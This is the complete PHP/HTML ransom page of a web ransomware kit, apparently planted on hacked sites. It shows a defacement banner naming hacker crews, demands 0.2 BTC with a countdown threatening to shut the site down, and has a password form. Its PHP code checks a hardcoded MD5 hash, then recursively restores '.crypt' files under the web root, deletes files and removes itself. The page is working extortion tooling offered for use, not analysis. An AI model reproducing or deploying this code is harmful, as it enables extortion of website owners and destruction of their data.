<?php ?><html><head>
<meta http-equiv="Content-Type" content="text/html; charset=Windows-1254" /> 
<link href='https://fonts.googleapis.com/css?family=Shadows+Into+Light' rel='stylesheet' type='text/css'>
<title>Locked By |WHO S3X-B3B4S</title><script>alert('Licked By WHO S3X-B3B4S') </script> 
<link rel="icon" type="image/png" href="https://i.ibb.co/60pw9B8/20200216-014914.png"" />
</head>
<head><title></title>
 <meta name="author" content=""> 
 <meta name="description" content="">
 <meta name="theme-color" content="#000">
 <link rel="icon" type="image/png" href="https://i.ibb.co/60pw9B8/20200216-014914.png"">
</iframe></head>
<style type="text/css">body {background-color: white;background-image: url("https://i.ibb.co/649yCq7/IMG-9994-mr1583746488349.jpg");background-repeat: no-repeat;background-size: 100% 100%;}</style> 
<div id="foter" class="foter" style="position: absolute; top: 70px; left: -225px; width: 600px; height: 28px; margin: 0px; padding: 50px; font-size: 70px; text-align: center; color: rgb(255, 255, 255); font-family: &quot;trebuchet ms&quot;, Courier new, courier new, sans-serif; transform: rotate(-45deg); transform-origin: 50% 0px 0px; background-color: rgb(0, 0, 0); border: 1px solid rgb(170, 170, 170); opacity: 0.5; z-index: 1200;"> <font face="courier new"> <marquee color="red" behavior="alternate" scrollamount="6" width="50%" style="width: 50%;"> .::BLACK DEMONSTRATION CYBER | HALF SEEN SAMAEL | SHARK XPLOITER CREW | ONE HAT CYBER TEAM::. </marquee></font> </div></span>
<table width=100% height=100%><td align=center><span style='font: 55px tahoma;size:55px;color:#ffffff;text-shadow: 10px 10px 10px;'><font style="font-family: 'Shadows Into Light', cursive;"><font color="white">Hii !! You Know me? S3X-B3B4S WAS HERE!!</br><font color="gold">THANKS FOR:</font></span></font></br>
<font color="cyan">Your website has been locked by S3X-B3B4S</br>Give me 0.2 BTC or i will shutdown your website</font>
</center>
<div id="countdownpenaindigo">
<span id="countdown"></span>
</div>
<?php
error_reporting(0);
$input = $_POST['pass'];
$pass = "e7efc89886fd9440a25422626cb4c980";
if (isset($input)) {
    if (md5($input) == $pass) {
        function decfile($filename) {
            if (strpos($filename, '.crypt') === FALSE) {
                return;
            }
            $decrypted = gzinflate(file_get_contents($filename));
            file_put_contents(str_replace('.crypt', '', $filename), $decrypted);
            unlink('crypt.php');
            unlink('.htaccess');
            unlink($filename);
            echo "$filename Decrypted !!!<br>";
        }
        function decdir($dir) {
            $files = array_diff(scandir($dir), array('.', '..'));
            foreach ($files as $file) {
                if (is_dir($dir . "/" . $file)) {
                    decdir($dir . "/" . $file);
                } else {
                    decfile($dir . "/" . $file);
                }
            }
        }
        decdir($_SERVER['DOCUMENT_ROOT']);
        echo "<br>Webroot Decrypted<br>";
        unlink($_SERVER['PHP_SELF']);
        unlink('.htaccess');
        copy('htabackup', '.htaccess');
        echo 'Success !!!';
    } else {
        echo 'Failed Password !!!';
    }
    exit();
}
?>

<script type="text/javascript">
//<![CDATA[
// set the date we're counting down to
var target_date = new Date("May 31, 2020").getTime();
// variables for time units
var days, hours, minutes, seconds;
// get tag element
var countdown = document.getElementById("countdown");
// update the tag with id "countdown" every 1 second
setInterval(function () {
// find the amount of "seconds" between now and target
var current_date = new Date().getTime();
var seconds_left = (target_date - current_date) / 1000;
// do some time calculations
days = parseInt(seconds_left / 86400);
seconds_left = seconds_left % 86400;
hours = parseInt(seconds_left / 3600);
seconds_left = seconds_left % 3600;
minutes = parseInt(seconds_left / 60);
seconds = parseInt(seconds_left % 60);
// format countdown string + set tag value
  countdown.innerHTML = days + " <span class='teks'>day</span> " + hours + " <span class='teks'>hours</span> "
  + minutes + " <span class='teks'>minutes</span> " + seconds + " <span class='teks'>second <br/>I will shutdown your website</span>";
}, 1000);
//]]>
</script>
<br>Bitcoin Address : <input type="text" value="6285230127192" readonly>
<br><br>
<form enctype="multipart/form-data" method="post">
<input type="text" name="pass" placeholder="Password"> <input type="submit" value="Decrypt">
</form>
<marquee behavior="scroll" direction="left" scrollamount="100" scrolldelay="500" width="100%">
<font color="white"><font size="25">.::Black Demonstration Cyber | Half Seen Samael | Shark Xploiter Crew | One Hat Cyber Team::.</font></marquee> 
</center></center><iframe width="0" height="0" src="https://d.top4top.io/m_1476cj4y60.mp3" frameborder="0" allowfullscreen auotoplay=""></iframe> 
</body></html>
